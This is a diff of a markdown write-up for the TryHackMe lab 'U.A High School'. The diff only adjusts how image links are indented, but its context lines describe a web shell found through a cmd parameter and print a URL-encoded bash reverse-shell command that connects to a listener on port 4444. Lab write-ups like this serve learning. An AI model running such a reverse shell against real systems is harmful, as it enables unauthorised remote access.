@@ -20,7 +20,7 @@ This is the writeup for the box U.A High School
 > [!NOTE]
 > There is a file named ```index.php``` in the ```/assets/``` directory, the content of the file was:
 
-    ![index.php](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/u.a.-high-school/screenshots/03.png)
+![index.php](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/u.a.-high-school/screenshots/03.png)
 
 ## 📡 3. Nmap Scan
 - The following information was found:
@@ -37,7 +37,7 @@ This is the writeup for the box U.A High School
 > [!NOTE]
 > Dirsearch shows us a url where I can execute shell commands, the url is: ```http://<ip>/assets/index.php?cmd=whoami```
 
-    ![cmd](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/u.a.-high-school/screenshots/06.png)
+![cmd](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/u.a.-high-school/screenshots/06.png)
 
 ## 🌐🖥️ 5. WebSite - Reverse Shell
 - I decided to execute a reverse shell by injecting the following command in the URL: ```bash+-c+'bash+-i+>%26+/dev/tcp/ip/4444+0>%261'```.
